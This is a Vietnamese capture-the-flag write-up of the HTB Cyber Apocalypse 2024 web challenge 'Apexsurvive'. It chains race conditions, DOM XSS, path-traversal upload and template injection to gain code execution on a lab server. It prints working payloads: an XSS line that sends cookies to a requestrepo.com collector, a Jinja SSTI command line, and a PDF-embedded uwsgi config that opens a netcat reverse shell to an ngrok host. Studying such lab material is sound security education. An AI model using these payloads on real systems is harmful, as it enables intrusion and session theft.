---
title: Cyber Apocalypse 2024 Write Up
tags: [CTF]
slug: htb-cyber-apocalypse-2024
date: 2024-03-15 10:31:07+0000
image: cover.jpg

---

Dạo này mình khá là hay viết wu các ctf challenge (chắc chắn không phải là do ngày trước mình lười), nó dường như đã tạo cho mình thói quen hàng tuần mình sẽ wu lại những challenge mình chơi và mình thấy hay và học được nhiều thứ từ nó. Câu lạc bộ mình tuần này có tham gia giải HTB - Cyber Apocalypse 2024, phải công nhận đây là một giải dài hơi và mình đã tốn tương đối thời gian cho các challenge web của giải này (cụ thể là 4 ngày) nhưng vẫn không thể solve được hết web challenge của giải, bản thân mình còn phải học hỏi rất nhiều nữa mới có thể hiểu và solve được dạng bài web cuối cùng nếu lần sau còn gặp lại. Giải đã kết thúc và cũng nhờ sự cố gắng, try hard của các anh em trong câu lạc bộ đến từ mọi mảng mà clb mình cũng đạt được thứ hạng mình nghĩ là khá cao , hehe.
Lan man vậy cũng đủ rồi, sau đây sẽ là quá trình mình và các teamates trong KCSC đi giải các challenge web HTB, cũng như cách hiểu của mình về web chall đó. Let's go!!

## Apexsurvive 
![image](https://hackmd.io/_uploads/BJWQ18b0p.png) 
### Preface
Đây là một chall white box nên mình download source về rồi dựng local khai thác cho nó tiện theo dõi, hehe :")))
Sau khi dựng xong thì mình cũng phải khá choáng vì dockerfile của bài này những 70 dòng, nên mình tò mò đọc để nắm trước cần phải làm gì ở chall này
```dockerfile!
# Setup flag
COPY flag.txt /root/flag
RUN chmod 600 /root/flag

# Setup readflag
COPY config/readflag.c /
RUN gcc -o /readflag /readflag.c && chmod 4755 /readflag && rm /readflag.c
```
Docker như này là mình phải RCE để lấy flag rùi
Chall có 2 service, 1 service web chính chạy python, và service email chạy js (và bot), nên mình nghĩ chắc sẽ có cả lỗ hổng client side và server side trong challenge này
### Verify email token
Vào chall thì mình được 'hướng dẫn' đăng kí với tên `test@email.htb` và để nhận được token email verify, nên cũng nhanh nhảu register và nhận được token ở endpoint `/email` khi đã vào account settings và chọn verify:
![image](https://hackmd.io/_uploads/HyQiJEmC6.png)
Sau khi verify mình thấy có chức năng report và tham số truyền vào là ID của sản phẩm có tại `/challenge/home`(nghe mùi xss quá) 
Đi vào đọc source, mình thấy có endpoint `/eternal` khá hay khi cho phép redirect đến endpoint mình control:
```python!
@web.route('/external')
def external():
    url = request.args.get('url', '')

    if not url:
        return redirect('/')
    
    return redirect(url)
```
Với việc cookie được set **samesite: strict**, mình nghĩ đến việc bypass Samesite Strict bằng redirect nên đã ngồi với thằng này cả buổi nhưng không có kết quả :cry:
### Mò mẫm source code
Sau khi tốn kha khá thời gian với thằng endpoint này mà không được kết quả gì, mình quyết định tạm thời bỏ qua và hướng đến các chức năng khác, có 2 chức năng đáng chú ý khi mình có thể lên được admin, đó là thêm sản phẩm/addItem và thêm contract/addContract.
- Chức năng thêm sản phẩm có thể được sử dụng khi mình thỏa mãn **isInternal** (cụ thể là thuộc tính **isInternal** của user trong db là true) thì có thể sử dụng, addItem dùng để thêm một sản phẩm mới vào shop. Tuy nhiên thì các input cũng đã được sanitize chỉ cho phép nhập vào các tag và attribute nhất định được quy định trong `middlewares.py`
```python!
@api.route('/addItem', methods=['POST'])
@isAuthenticated
@isVerified
@isInternal
@antiCSRF
@sanitizeInput
def addItem(decodedToken):
    name = request.form.get('name', '')
    price = request.form.get('price', '')
    description = request.form.get('description', '')
    image = request.form.get('imageURL', '')
    note = request.form.get('note', '')
    seller = request.form.get('seller', '')

    if any(value == '' for value in [name, price, description, image, note, seller]):
        return response('All fields are required!'), 401

    newProduct = addProduct(name, image, description, price, seller, note)

    if newProduct:
        return response('Product Added')
    
    return response('Something went wrong!')
```
- Chức năng mình muốn nói đến thêm contract, khi upload 1 file lên, server lưu nội dung vào `/tmp/temporaryUpload` rồi mới check nội dung của file đó ở hàm checkPDF sử dụng PdfReader mode strict (khó cứu ca này). Nếu check thành công sẽ nối `/app/application`, `contracts` và file name bằng **os.path.join** để tạo thành file path hoàn chỉnh. Hàm **path.join** dính path traversal nặng và đây là lỗi mình cần khai thác để exploit path traversal upload file to RCE.
![image](https://hackmd.io/_uploads/r1noqEQR6.png)
```python!
@api.route('/addContract', methods=['POST'])
@isAuthenticated
@isVerified
@isInternal
@isAdmin
@antiCSRF
@sanitizeInput
def addContract(decodedToken):
    name = request.form.get('name', '')

    uploadedFile = request.files['file']

    if not uploadedFile or not name:
        return response('All files required!')
    
    if uploadedFile.filename == '':
        return response('Invalid file!')

    uploadedFile.save('/tmp/temporaryUpload')

    isValidPDF = checkPDF()

    if isValidPDF:
        try:
            filePath = os.path.join(current_app.root_path, 'contracts', uploadedFile.filename)
            with open(filePath, 'wb') as wf:
                with open('/tmp/temporaryUpload', 'rb') as fr:
                    wf.write(fr.read())

            return response('Contract Added')
        except Exception as e:
            print(e, file=sys.stdout)
            return response('Something went wrong!')
    
    return response('Invalid PDF! what are you trying to do?')
```
- Buồn ở chỗ chức năng này không dễ có tí nào vì phải là admin thì mới sử dụng được, bài toán lúc này lại quay về việc làm thế nào để lên được admin

Tiếp tục đọc source, mình ngốn khoảng 1 buổi tiếp theo để nghĩ cách bypass admin nhưng chẳng có cách nào khả thi, cũng may là cuộc thi kéo dài nhiều ngày nên mình có nhiều thời gian suy nghĩ hơn. Lúc này mình đã chịu và không tìm được cách leo lên admin, nhưng lại biết được vuln sau khi lên admin (aizzz chíc tịc). Nhận thấy chức năng report sẽ lấy credential của admin và gửi đi nên mình sử dụng chúng đăng nhập vào admin exploit lỗi upload file, các teammates sẽ lo vụ leo lên admin :laughing: 
```!
2024-03-16 22:34:49 127.0.0.1 - - [16/Mar/2024 15:34:49] "GET /visit?productID=1&email=xclow3n@apexsurvive.htb&password=d8Bfk5Fw6oiROrxqrS2TmLc4NF1ZHU3r0OQfZSzbHna2DGljQbEmNG6st7uZ9QQ7 HTTP/1.1" 200 -
```
### Exploit file upload
Nói đến upload file python thì cách đầu tiên mình nghĩ đến là upload ghi đè file `__init__.py` nhưng web này lại không có nên hướng đi đó không khả thi cho lắm :cry:
Vì mới gần đây có một bài upload python cũng na ná, teammate [MacHongNam](https://hackmd.io/@machongnam) đã gợi ý mình cách ghi đè file html và ssti trong file đó để khi server render_template sẽ trigger ssti để RCE. Điều kiện là file templates đó chưa được render lần nào, vì render_template sẽ ghi nhớ các lần render nên nếu render lỗi khả năng phải chạy lại docker làm lại là rất cao 
Mình sẽ chọn templates `info.html` được render ở path `/` để inject -> trang chủ giới thiệu, chỉ cần lúc đầu mình truy cập thẳng vào path `/challenge` và `/email` là được
```python!
@challengeInfo.route('/')
def info():
    return render_template('info.html')
```
File sau khi được upload sẽ **lưu** vào `/tmp/temporaryUpload` rồi mới được check, sau khi check thành công nội dung được đưa vào folder contracts hoặc là trả về thông báo invalid PDF.
=> Phải mất 2 lần ghi file thì file mới được ghi thành công, mình hoàn toàn có thể lợi dụng lúc file pdf đang được check để upload 1 file html nữa thế chỗ file pdf cũ => **race condition**, sau đó sử dụng path traversal ghi đè html là có thể rce thành công rồi
Mình bắt tay vào viết script upload file race condition nhưng bằng một lý do gì đấy mà script của mình đều ghi đè pdf vào templates thay vì file html mà mình mong muốn =))). Mình stuck ở đây cũng phải 2 tiếng trước khi quyết định méo dùng script python nữa mà chuyển qua xài Burp Repeater cho nó nhanh.
Server check pdf chặt nên mình sẽ gửi 1 pdf valid lấy mẫu request, và file html mình copy nguyên từ thằng gốc và nhét thêm dòng:
```python!
{% print(namespace.__init__.__globals__.os.popen('/readflag').read()) %}
```
Thay đổi tên file của các file html thành `/app/application/templates/info.html`, mình gửi đi cùng lúc 1 req upload pdf và 6 req upload html
![image](https://hackmd.io/_uploads/BJIR-rXRp.png)
Sau một hồi spam Ctrl Space thì mình đã ghi đè được file info.html
![image](https://hackmd.io/_uploads/SyOQfBmCp.png)
Khai thác thành công!!
![image](https://hackmd.io/_uploads/SJwvMBmAa.png)

Tuy rằng đã có thể khai thác thành công, nhưng mình vẫn chưa tìm được cách nào để có thể lên được admin, cùng lúc này teammate [MacHongNam](https://hackmd.io/@machongnam) bảo mình hãy nghĩ cách để lên được **isInternal** nhằm sử dụng api /addItem, vì mình có thể dom based XSS tại endpoint /product/product-id
### Bypass sanitized input to trigger XSS
Nghe như vậy thì mình đã tìm đến path addProduct để thêm sản phẩm, khi đọc đến `product.html` thì mình đã thấy vì sao có thể dom based XSS:
```javascript!
<script>
    let note = `{{ product.note | safe }}`;
    const clean = DOMPurify.sanitize(note, {FORBID_ATTR: ['id', 'style'], USE_PROFILES: {html:true}});

    document.getElementById('note').innerHTML += clean;
</script>
```
Note là một thuộc tính mà mình control khi addProduct -> sử dụng  backtick escape khỏi đoạn khai báo note -> XSS:
![image](https://hackmd.io/_uploads/BJfcIS7Ca.png)![image](https://hackmd.io/_uploads/rJKGwHQRa.png)
Kết hợp với việc có thể report cho admin về các product, mình có payload sau để lấy session của admin: 
```javascript!
`;fetch("https://9vja3pan.requestrepo.com/?"+document.cookie);//
```
### Bypass isInternal with race condition 
Tiếp tục vùi đầu vào đống source code, mình thấy được ở đoạn verifyEmail, email được tách ra thành tên và hostname, kiểu `a@gmail.com` thì tên là `a` và hostname là `gmail.com`. Nếu như hostname của mình là `apexsurvive.htb` thì database sẽ set **isInternal="true"**, đây chính là chỗ mình cần phải exploit
```python!
def verifyEmail(token):
    user = query('SELECT * from users WHERE confirmToken = %s', (token, ), one=True)

    if user and user['isConfirmed'] == 'unverified':
        _, hostname = parseaddr(user['unconfirmedEmail'])[1].split('@', 1)
        
        if hostname == 'apexsurvive.htb':
            query('UPDATE users SET isConfirmed=%s, email=%s, unconfirmedEmail="", confirmToken="", isInternal="true" WHERE id=%s', ('verified', user['unconfirmedEmail'], user['id'],))
        else:
            query('UPDATE users SET isConfirmed=%s, email=%s, unconfirmedEmail="", confirmToken="" WHERE id=%s', ('verified', user['unconfirmedEmail'], user['id'],))
        
        mysql.connection.commit()
        return True
    
    return False
```
Ngặt nghèo ở chỗ là trang email của chúng ta chỉ nhận email gửi đến `test@email.htb` :cry:. Sau khi bế's tắc một khoảng thời gian khá lâu thì teammate [Chương](https://hackmd.io/@chuong) tìm ra được cách để nhận được email của tài khoản có hostname `apexsurvive.htb` là **race condition**:
- Khi chỉnh sửa profile từ một email đã verify thành một email khác, server sẽ tự gửi token đến email đó
```python!
@api.route('/profile', methods=['POST'])
    ...
    if result:
        if result == 'email changed':
            sendEmail(decodedToken.get('id'), email)
        return response('Profile updated!')
```
- API sendVerification cho biết server sẽ lấy thông tin của user đó, kiểm tra xem user đã được confirm email chưa, nếu chưa sẽ gửi token đến email đó
```python!
@api.route('/sendVerification', methods=['GET'])
@isAuthenticated
@sanitizeInput
def sendVerification(decodedToken):
    user = getUser(decodedToken.get('id'))

    if user['isConfirmed'] == 'unverified':
        if checkEmail(user['unconfirmedEmail']):
            sendEmail(decodedToken.get('id'), user['unconfirmedEmail'])
            return response('Verification link sent!')
        else:
            return response('Invalid Email')
    
    return response('User already verified!')
```
-> Có thể race condition save profile 2 email, đồng thời sendVerification để yêu cầu gửi token đến email, từ đó ghi đè nội dung server gửi cho `test@email.htb` thành của `test@apexsurvive.htb`, từ đó lấy token của email `test@apexsurvive.htb` đi verify là được **isInternal=true**.
### Complete the attack chain & Exploit
Các bước tấn công đã đầy đủ, nên mình sẽ tổng hợp lại như sau:
- Race condition verify email -> bypass isInternal
- Dom Based XSS tại /addProduct -> lấy session admin/ bypass admin
- Race condition upload file -> RCE

Attack chain có tận 2 lần race condition nên việc có thể solve nhanh hay chậm nó phụ thuộc vào may mắn khá nhiều =)), sau khi rõ hướng thì mình deploy web rồi làm luôn và theo như mình thấy thì race verify email là công đoạn lâu nhất.
- Bypass isInternal
Mình tiếp tục sử dụng Burp Repeater để race condition email, với 3 req sendVerification, 1 req update profile test@email.htb và 1 req test@apexsurvive.htb:
![image](https://hackmd.io/_uploads/HJaQ_L7R6.png)
Cuối cùng cũng có token có thể verify :cry:
![image](https://hackmd.io/_uploads/rJd7c8QAa.png)
![image](https://hackmd.io/_uploads/r1L4qLQAa.png)
- Bypass admin
Sử dụng payload bên trên và report product id, mình có admin token:
![image](https://hackmd.io/_uploads/SJeAcLXCT.png)
![image](https://hackmd.io/_uploads/SJSTiUXCT.png)
Đến giờ truy cập admin để RCE rồi
![image](https://hackmd.io/_uploads/HJJE3LX06.png)
- Upload file
Mình làm y hệt như ở trên local và lụm được flag của challenge: 
![image](https://hackmd.io/_uploads/rJ27AU7CT.png)
- Flag: **HTB{0H_c0m3_0n_r4c3_c0nd1t10n_4nd_C55_1nj3ct10n_15_F1R3}**

P/s: Sau khi làm xong mình mới thấy là nếu như render ra pdf thì trang web sẽ bị lỗi và không lưu lại template đó nên mình có thể tiếp tục race mà không phải redeploy challenge.
### Another workaround to bypass PDF upload
Sau khi đi tản mạn write up của mọi người, mình có tìm được bài write up này có một solution khác để trigger RCE thông qua upload file: https://blog.elmosalamy.com/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/
Đây là một cách rất hay khi server `uwsgi` dính lỗi arbitary PDF upload, cụ thể là nhằm vào file `uwgsi.ini` (Chi tiết ở document): https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html
- `uwsgi` có khả năng đọc file config của chính nó kể cả khi file dưới dạng binary, miễn sao nó tìm được chuỗi bắt đầu khai báo config hợp lệ: `[uwsgi]`
- `uwsgi` sử dụng operator `@` và các scheme để hỗ trợ include, đọc file và call các function, trong đó có scheme `exec` dùng để thực thi câu lệnh -> Thứ mình cần dùng:
```
    [uwsgi]
    ; read from a process stdout
    body = @(exec://whoami)
```

Việc tấn công vào file ini sẽ cần một yếu tố quan trọng khác: Làm thế nào để `uwsgi` reload lại config của chính nó?
Điều này có thể được giải quyết nếu như `uwsgi` config sẵn chức năng dùng để debug `py-auto-reload`, nếu như phát hiện sự thay đổi của các file trong server thì config sẽ được reload.
Việc upload file PDF là chưa đủ, nên sau đó mình cần phải ghi đè một file `.py` thì server mới reload lại config, từ đó trigger RCE.
```
    py-autoreload = 3
```
Document cũng có luôn cả POC nên mình sẽ sửa để đổi thành payload reverse shell:
```python!
from fpdf import FPDF
from exiftool import ExifToolHelper

with ExifToolHelper() as et:
    et.set_tags(
        ["lmao.jpg"],
        tags={"model": "&#x0a;[uwsgi]&#x0a;foo = @(exec://nc 0.tcp.ap.ngrok.io 18726 -e /bin/sh)&#x0a;"},
        params=["-E", "-overwrite_original"]
    )

class MyFPDF(FPDF):
    pass

pdf = MyFPDF()

pdf.add_page()
pdf.image('./lmao.jpg')
pdf.output('exploit.pdf', 'F')
```
- Lưu ý: Nếu báo lỗi không có module exiftool thì mình sẽ chạy câu lệnh
```
    python3 -m pip install -U pyexiftool
```

Sau khi gen ra PDF thì mình gửi đi để ghi đè `/app/uwsgi.ini`
![image](https://hackmd.io/_uploads/ByNAHNrR6.png)
Ghi đè tiếp `/app/application/database.py` để trigger `uwgsi` reload lại config
![image](https://hackmd.io/_uploads/BJ0GU4BAT.png)
Log server thông báo việc file `database.py` đã bị thay đổi, tiến hành kill tiến trình và khởi động lại /app, load lại config
![image](https://hackmd.io/_uploads/HJ4zLESRp.png)
Reverse Shell thành công
![image](https://hackmd.io/_uploads/SyS4L4H0p.png)
